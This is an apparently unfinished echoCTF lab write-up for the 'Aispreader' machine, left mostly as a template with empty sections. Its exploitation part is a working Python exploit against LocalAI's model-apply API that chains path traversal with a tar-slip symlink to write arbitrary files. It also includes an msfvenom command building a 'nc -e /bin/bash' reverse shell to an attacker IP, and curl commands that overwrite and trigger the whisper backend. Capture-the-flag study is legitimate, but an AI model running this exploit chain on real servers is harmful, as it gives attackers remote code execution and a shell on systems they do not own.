---
description: >-
  Aispreader echoCTF Machine
title: Aispreader (Expert)                # Add title here
date: 2025-06-09 08:00:00 -0600                           # Change the date to match completion date
categories: [echoCTF, Expert]                     # Change Templates to Writeup
tags: []     # TAG names should always be lowercase; replace template with writeup, and add relevant tags
show_image_post: true                                    # Change this to true
image: /assets/img/icons/Aispreader.png                # Add infocard image here for post preview image
---
##### Host entries
```bash
10.0.14.34
```

### Content

-   
- 

### Reconnaissance

Initial reconnaissance for TCP ports
```bash

```
Services and Versions running:
```bash

```

### Exploitation

https://huntr.com/bounties/752d2376-2d9a-4e17-b462-3c267f9dd229

```bash
import json, time, tarfile

from io import BytesIO
from random import randbytes, randint
from pathlib import Path
from argparse import ArgumentParser
from requests import Session

from http.server import HTTPServer, BaseHTTPRequestHandler
from multiprocessing import Process, Queue


# small template for models that will be served to localai:
model_tmpl = """
name: {}
files:
  - filename: {}
    uri: {}
"""


g_queue = Queue() # used for some janky ipc with http server

class HttpHandler(BaseHTTPRequestHandler):
    def log_message(self, format, *args):
        pass

    def do_GET(self):
        self.send_response(200)
        self.send_header('content-type', 'application/text')
        self.end_headers()
        rsp = g_queue.get()
        print(f"response to {self.path}:", rsp[:64], "...")
        self.wfile.write(rsp)

def run_httpd(lhost, lport):
    print(f"running httpserver on {lhost}:{lport}")
    httpd = HTTPServer((lhost, lport), HttpHandler)
    httpd.serve_forever()


if __name__ == "__main__":
    parser = ArgumentParser()
    parser.add_argument("--lhost", default="localhost")
    parser.add_argument("--url", default="http://localhost:8080")
    parser.add_argument("--local_path", default="poc.txt")
    parser.add_argument("--remote_path", default="/tmp/poc.txt")
    args = parser.parse_args()

    remote_path = Path(args.remote_path)


    # --lhost is attackers host as seen from the localai, so if localai
    # runs in docker use 172.17.0.1 (or something like that depending on
    # your system), if running locally just use localhost:
    lport = randint(50000, 60000)
    attacker_url = f"http://{args.lhost}:{lport}"

    # run http service that will serve the files:
    proc = Process(target=run_httpd, args=(args.lhost, lport))
    proc.start()
    time.sleep(1)

    with Session() as s:
        # use another vulnerability to delete the target first, because our "arbitrary"
        # write can not overwrite files, just write a new file:
        m_name = "m_" + randbytes(4).hex()
        g_queue.put(f"name: {m_name}\n".encode())
        rsp = s.post(f"{args.url}/models/apply", json={
            "url" : f"http://{args.lhost}:{lport}/{m_name}.yaml",
            "overrides" : {
                "mmproj" : f"../../../../../../../../../../{args.remote_path}",
            }
        })
        rsp = s.post(f"{args.url}/models/delete/{m_name}")

        # create a model from a config and let it download the files. If the file is an archive
        # it will automatically uncompress the contents:
        m_name = "m_" + randbytes(4).hex()
        model_yaml = model_tmpl.format(m_name, f"{m_name}.tar", f"{attacker_url}/{m_name}.tar")

        g_queue.put(model_yaml.encode())
        rsp = s.post(f"{args.url}/models/apply", json={
            "url" : f"http://{args.lhost}:{lport}/{m_name}.yaml",
        })

        # create a tar file with a symlink pointing to the directory of `remote_path`.
        redirect = randbytes(4).hex()
        fake_tar = BytesIO()
        with tarfile.open(fileobj=fake_tar, mode="w") as tar:
            info = tarfile.TarInfo(redirect)
            info.type = tarfile.SYMTYPE
            info.linkname = str(remote_path.parent)
            tar.addfile(info)

        g_queue.put(fake_tar.getvalue())

        # do another tarslip, but this time save the .tar file to symlink'ed directory
        # so that the contents of this new tar are extracted there. this will allow to
        # write a file with the same attributes as `args.local_path`
        m_name = "m_" + randbytes(4).hex()
        model_yaml = model_tmpl.format(m_name, f"{redirect}/{redirect}.tar", f"{attacker_url}/{m_name}.tar")
        g_queue.put(model_yaml.encode())

        rsp = s.post(f"{args.url}/models/apply", json={
            "url" : f"http://{args.lhost}:{lport}/{m_name}.yaml",
        })

        fake_tar = BytesIO()
        with tarfile.open(fileobj=fake_tar, mode="w") as tar:
            tar.add(args.local_path, arcname=str(remote_path.name))

        g_queue.put(fake_tar.getvalue())

        time.sleep(1)
        input("press enter to continue...")

    proc.kill()

```

```bash
msfvenom -p linux/x64/exec CMD='nc -e /bin/bash 10.10.5.122 1234' -f elf-so > pwn
```

```bash
python exploit.py --url='http://10.0.14.34:8080' --lhost='10.10.5.122' --remote_path='/tmp/localai/backend_data/backend-assets/grpc/whisper' --local_path='pwn'
```

```bash
curl https://upload.wikimedia.org/wikipedia/commons/1/1f/George_W_Bush_Columbia_FINAL.ogg -o test.ogg
```


```bash
curl http://10.0.14.34:8080/models/apply -H 'Content-Type: application/json' -d '{"id":"whisper-base-en-q5_1"}'
```

```bash
curl http://10.0.14.34:8080/v1/audio/transcriptions -H 'Content-Type: multipart/form-data' -F file='@test.ogg' -F model='whisper-base-en-q5_1'
```

```bash

```

### Privilege Escalation

### Post Exploitation

### Credentials

### Notes

-   Chisel have different configurations, this time we use a Forward SOCKS Proxy, which is a bind shell, that is not neccessarily the easiest way to forward the remote port, but is a new way to consider in case that a reverse shell is not possible.
-   Always look for exploits, analyze them and check if something can be useful to exploit the machine.
-   Chisel has some

### References



